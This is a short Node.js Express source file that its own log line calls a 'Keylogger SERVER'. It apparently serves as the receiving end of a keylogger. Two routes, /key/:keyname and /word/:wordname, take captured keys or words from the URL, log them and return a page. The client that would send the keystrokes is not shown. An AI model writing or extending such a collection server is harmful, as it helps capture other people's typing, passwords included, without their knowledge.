const express = require('express')
const app = express()
const port = 3000

app.set('view engine', 'ejs');

app.engine('html', require('ejs').renderFile);

app.get('/key/:keyname', (req, res) => {
    res.render("complete.html")
    console.log('Request for a key!')
    console.log("Key: " + req.params.keyname)
})

app.get('/word/:wordname', (req, res) => {
    res.render("complete.html")
    console.log('Request for a key!')
    console.log("Key: " + req.params.wordname)
})

app.listen(port, () => {
    console.log(`Keylogger SERVER listening: 127.0.0.1:3000`)
})